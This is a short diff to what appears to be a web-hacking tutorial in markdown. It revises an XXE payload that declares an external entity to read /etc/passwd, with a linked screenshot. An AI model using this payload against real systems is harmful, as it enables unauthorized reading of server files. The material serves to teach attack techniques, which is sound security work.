@@ -27,7 +27,7 @@ If the last command was useful we can now try to report critical files using Wra
 <br />
 
 ```xml
-<!ENTITY file SYSTEM "file:///etc/passwd">
+<!DOCTYPE foo [<!ENTITY showFile SYSTEM "file:///etc/passwd"> ]>
 ```
 <br /> 
 <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/eac5fa56-da99-429f-9d50-4168c56bac44" width="800">
